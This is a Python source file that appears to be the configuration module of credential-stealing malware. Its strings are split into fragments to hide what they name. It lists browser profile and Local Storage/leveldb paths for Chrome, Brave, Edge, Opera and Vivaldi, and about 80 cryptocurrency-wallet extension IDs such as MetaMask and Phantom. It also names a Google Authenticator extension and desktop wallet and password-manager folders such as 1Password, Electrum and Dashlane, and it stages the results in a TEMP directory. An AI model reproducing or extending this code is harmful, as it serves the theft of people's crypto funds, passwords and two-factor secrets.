APPDATA = "App" + "Data"
LOCAL = "Loc" + "al"
ROAMING = "Roam" + "ing"
TEMP = "Temp"
USERPROFILE_ENV = "USER" + "PRO" + "FILE"
TEMP_ENV = "TEMP"
TMP_ENV = "TMP"
LOCALAPPDATA_ENV = "LOCAL" + "APP" + "DATA"
APPDATA_ENV = "APP" + "DATA"
LOCALAPPDATA_TEMPLATE = "%Local" + "App" + "Data%"
APPDATA_TEMPLATE = "%Ap" + "pata%"

UDATA = "Use" + "r Data"
DPROF = "Def" + "ault"
PPREF = "Profile "

LEXTS = "Local Ext" + "ension " + "Settings"
SEXTS = "Sync Ext" + "ension " + "Settings"
LSTOR = "Local St" + "orage"
LDB = "level" + "db"
DBS = "data" + "bases"
LPEXT_ID = "chro" + "me-ext" + "ension_hdokiejnp" + "imakedhajhdlcegeplioahd_0"

GGL = "Goo" + "gle"
CHR = "Chro" + "me"
BRVSW = "Brave" + "Software"
BRVBR = "Brave-" + "Browser"
MSFT = "Micro" + "soft"
EDG = "Edge"
CHRM = "Chro" + "mium"
OPSW = "Opera " + "Software"
OPST = "Opera " + "Stable"
VIV = "Viva" + "ldi"

BRCHR = r"AppData\Local\Google\Chrome\User Data"
BRBRV = r"AppData\Local\BraveSoftware\Brave-Browser\User Data"
BREDG = r"AppData\Local\Microsoft\Edge\User Data"
BRCHRM = r"AppData\Local\Chromium\User Data"
BROPR = r"AppData\Roaming\Opera Software\Opera Stable"
BRVIV = r"AppData\Local\Vivaldi\User Data"

def _init_browsers():
    import os
    local_appdata = os.getenv(LOCALAPPDATA_ENV, "")
    appdata = os.getenv(APPDATA_ENV, "")
    return {
        "0": os.path.join(local_appdata, GGL, CHR, UDATA),
        "1": os.path.join(local_appdata, BRVSW, BRVBR, UDATA),
        "3": os.path.join(local_appdata, MSFT, EDG, UDATA),
        "chr" + "omium": os.path.join(local_appdata, CHRM, UDATA),
        "ope" + "ra": os.path.join(appdata, OPSW, OPST),
        "vi" + "valdi": os.path.join(local_appdata, VIV, UDATA),
    }

BRS = _init_browsers()

def get_results_base_dir():
    import os
    from config import RESULTS_DIR_NAME
    temp_dir = os.getenv(TEMP_ENV) or os.getenv(TMP_ENV)
    if not temp_dir:
        user_profile = os.getenv(USERPROFILE_ENV, "")
        if user_profile:
            temp_dir = os.path.join(user_profile, APPDATA, LOCAL, TEMP)
    if not temp_dir:
        return ""
    return os.path.join(os.path.abspath(temp_dir), RESULTS_DIR_NAME)

CEXTS = {
    "aeachknmefph" + "ep" + "ccionboohckonoeemg": "Co" + "in" + "98",
    "aholpfdialjg" + "jf" + "homihkjbmgjidlcdno": "Ex" + "od" + "us",
    "bfnaelmomeim" + "hlpmgjnjophhpkkoljpa": "Ph" + "an" + "tom",
    "ejbalbakoplch" + "lghecdalmeeeajnimhm": "Met" + "aM" + "ask-" + "Ed" + "ge",
    "ejjladinnckdg" + "jemekebdpeokbikhfci": "Pet" + "ra" + "Ap" + "tos",
    "egjidjbpglich" + "dcondbcbdnbeeppgdph": "Tr" + "us" + "t",
    "fhbohimaelbohpjbbldcngcnapndodjp": "Bin" + "an" + "ce",
    "gjdfdfnbillbf" + "lbkmldbclkihgajchbg": "Te" + "rm" + "ux",
    "hifafgmccdpek" + "plomjjkcfgodnhcellj": "Cry" + "pto" + ".c" + "om",
    "hnfanknocfeofbddgcijnm" + "hnfnkdnaad": "Co" + "in" + "Ba" + "se",
    "ibnejdfjmmk" + "pcnlpebklmnkoeoihofec": "Tr" + "on" + "Li" + "nk",
    "lgmpcpglpngdoalbgeoldea" + "jfclnhafa": "Sa" + "fe" + "pa" + "l",
    "mcohi" + "lncbfahbmgdjkbpemcciiolgcge": "O" + "K" + "X", 
    "nkbihfbe" + "ogaeaoehlefnkodbefgpgknn": "Met" + "aM" + "ask",
    "nphplpgoakhhj" + "chkkhmiggakijnkhfnd": "T" + "o" + "n",
    "pdliaogehgdbhbnmkkliegh" + "mmjkpigpa": "B" + "y" + "Bi" + "t",
    "phkbamefing" + "gmakgklpkljjmgibohnba": "Po" + "nt" + "em",
    "kkpllkod" + "jeloidieedojogacfhpaihoh": "En" + "kr" + "ypt",
    "agoakfejjabomempkjle" + "pdflaleeobhb": "Co" + "re-" + "Cry" + "pto",
    "jiidi" + "aalihmmhddjgbnbgdfflelocpak": "Bi" + "tg" + "et",
    "kgdijkcfigl" + "ijhaglibaidbipiejjfdp": "Ci" + "ru" + "s",
    "k" + "kpehldckknjffeakihjajcjccmcjflh": "HB" + "A" + "R",
    "idnnbdplmphpflfnlkomgpfbpcgelopg": "Xv" + "er" + "se",
    "fccgmnglbhajioal" + "okbcidhcaikhlcpm": "Za" + "pi" + "t",
    "fijngjgcj" + "hjmmpcmkeiomlglpeiijkld": "Tal" + "is" + "ma" + "n",
    "enabgbdfcba" + "ehmbigakijjabdpdnimlg": "Ma" + "nt" + "a",
    "onhogfjeacn" + "foofkfgppdlbmlmnplgbn": "Su" + "b-" + "Pol" + "ka" + "dot",
    "amkmjjmm" + "flddogmhpjloimipb" + "ofnfjih": "Wo" + "mb" + "at",
    "glmhbknppefdmpemdmjnjlinpbclokhn": "Or" + "an" + "ge",
    "hmeobnfnfcmdkdcm" + "lblgagmfpfboieaf": "XD" + "EF" + "I",
    "acmacodkjbd" + "gmoleebolmdjonilkdbch": "Ra" + "bb" + "y",
    "fcfcfllfndlom" + "dhbehjjcoimbgofdncg": "Le" + "ap" + "Cos" + "mo" + "s",
    "anokgmphncpekkhc" + "lmingpimjmcooifb": "Com" + "pas" + "s-" + "Se" + "i",
    "epapihdplajc" + "dnnkdeiahlgigofloibg": "Se" + "nd" + "er",
    "efbglgofoippbgcjepnhiblaibcnclgk": "Ma" + "rt" + "ia" + "n",
    "ldinpeekobn" + "hjjdofggfgjlcehhmanlj": "Le" + "at" + "he" + "r",
    "lccbohhgfkdikaha" + "noclbdmaolidjdfl": "Wi" + "gw" + "am",
    "abkahkcbh" + "ngaebpcgfmhkoioedceoigp": "Ca" + "sp" + "er",
    "bhhhlbepdkba" + "padjdnnojkbgioiodbic": "So" + "lf" + "la" + "re",
    "klghhnkeealcohjjanjjdaeeggmfmlpl": "Ze" + "ri" + "on",
    "lnnnmfcpbkafcpgd" + "ilckhmhbkkbpkmid": "Ko" + "al" + "a",
    "ibljocddagjgh" + "mlpgihahamcghfggcjc": "Vi" + "rg" + "o",
    "ppbibelpc" + "jmhbdihakflkdcoccbgbkpo": "Un" + "i" + "Sa" + "t",
    "afbcbjpbpfadlkm" + "hmclhkeeodmamcflc": "Ma" + "th",
    "ebfidpplhabeedp" + "nhjnobghokpiioolj": "Few" + "ch" + "a-" + "Mo" + "ve",
    "fopmedgnkfpeb" + "gllppeddmmochcookhc": "S" + "uk" + "u",
    "gjagmgiddbbciopjhl" + "lkdnddhcglnemk": "Has" + "hp" + "ac" + "k",
    "jnlgamecbpm" + "bajjfhmmmlhejkemejdma": "Br" + "aa" + "vo" + "s",
    "pgiaag" + "fkgcbnmiiolekcfmljdagdhlcm": "St" + "ar" + "ga" + "ze" + "r",
    "khpk" + "pbbcccdmmclmpigdgddabeilkdpd": "Su" + "ie" + "t",
    "kil" + "npioakcdndlodeeceffgjdpojajlo": "Au" + "ro" + "x",
    "bopcbmipnjdcdfflf" + "gjdgdjejmgpoaab": "Bl" + "oc" + "k",
    "kmhcihpebfmpgmihbkipmjlmmioameka": "Et" + "er" + "nl",
    "aflkmfhebedbjioi" + "pglgcbcmnbpgliof": "Ba" + "ck" + "pa" + "ck",
    "ajkifnllfhikkjbjopkhm" + "joieikeihjb": "Mo" + "so",
    "pfccjkejcgoppjnllalolplgog" + "enfojk": "T" + "om" + "o",
    "jao" + "oiolkmfcmloonphpiiogkfckgciom": "Tw" + "et" + "ch",
    "kmphdnil" + "pmdejikjdnlbcnmnabepfgkh": "Os" + "mW" + "al" + "let",
    "hbbgbephgojik" + "ajhfbomhlmmollphcad": "R" + "is" + "e",
    "nbdhibgjnjpnkajagh" + "bffjbkcgljfgdi": "Ra" + "mp" + "er",
    "fldfpgipfncgndfolcbkdee" + "knbbbnhcc": "M" + "y" + "To" + "n",
    "jnmbobjmhlngoefaiojfljckilhh" + "lhcj": "On" + "e" + "Ke" + "y",
    "fcckkd" + "bjnoikooededlapcalpionmalo": "MO" + "BO" + "X",
    "gadbifgblme" + "dliakbceidegloehmffic": "Pa" + "ra" + "go" + "n",
    "opfgelmcmbiajame" + "pnmloijbpoleiama": "Ra" + "in" + "bo" + "w",
    "jfflgdhkeohhkelibbefd" + "cgjijppkdeb": "Or" + "d" + "Pa" + "y",
    "kfecffoibanimcnjeajlcnbabl" + "feafho": "Lib" + "on" + "om" + "y",
    "opcgpfmipidbgpenhmajoajpbobppdi" + "l": "S" + "u" + "i",
    "penjlddjkj" + "gpnkllboccdgccekpkcbin": "Op" + "en" + "Ma" + "sk",
    "kbdcddcmgoplfoc" + "kflacnnefaehaiocb": "Sh" + "el" + "l",
    "abogmiocnneedmmepnoh" + "nhlijcjpcifd": "Bl" + "ad" + "e",
    "omaabbefbmiijedngplfjmnoo" + "ppbclkk": "To" + "nk" + "ee" + "per",
    "cnncmdhjacpkmjmkcafchppbnpnhdm" + "on": "HA" + "VA" + "H",
    "eokbba" + "idfgdndnljmffldfgjklpjkdoi": "Fl" + "ue" + "nt",
    "fnjhmkhhmkb" + "jkkabndcnnogagogbneec": "R" + "on" + "in",
    "dmkamcknogkgcdfh" + "hbddcghachkejeap": "Ke" + "pl" + "r",
    "dlcobpjiigpikoobohmab" + "ehhmhfoodbb": "Arg" + "en" + "t" + "X",
    "aiifbnbfobpmeekipheeijim" + "dpnlpgpp": "St" + "at" + "io" + "n",
    "eajafomhmkipbjmfmhebemolk" + "cicgfmd": "T" + "ah" + "o",
    "mkpegjkblkkefacfnmkajcjmabijh" + "clg": "Ma" + "gic" + "Ed" + "en",
    "ffbcec" + "kpkpbcmgiaehlloocglmijnpmp": "In" + "it" + "ia",
    "lpfcbjknijp" + "eeillifnkikgncikgfhdo": "N" + "am" + "i",
    "fpkhgmpbidmiogeg" + "lndfbkegfdlnajnf": "Cos" + "mo" + "sta" + "tio" + "n",
    "kppfdiipphfccemcignhi" + "fpjkapfbihd": "Fr" + "on" + "ti" + "er",
    "fdjamakpfbbddfjaooikfcpapj" + "ohcfmg": "Da" + "sh" + "al" + "an" + "e",
}

AEXTS = {
    "bhghoama" + "pcdpbohphigoooaddinpkbai": "Go" + "og" + "le" + "Au" + "th"
}

APATHS = {
    "%Local" + "App" + "Data%\\1Password": "1" + "pa" + "ss",
    "%App" + "Data%\\Ex" + "odus": "Ex" + "od" + "us",
    "%App" + "Data%\\at" + "omic": "at" + "om" + "ic",
    "%App" + "Data%\\El" + "ectrum": "El" + "ec" + "tr" + "um",
    "%App" + "Data%\\WinA" + "uth": "wi" + "na" + "ut" + "h",
    "%App" + "Data%\\Prox" + "ifier4\\Profiles": "pro" + "xif" + "ier" + "4",
    "%App" + "Data%\\Dash" + "lane": "Da" + "sh" + "la" + "ne",
}
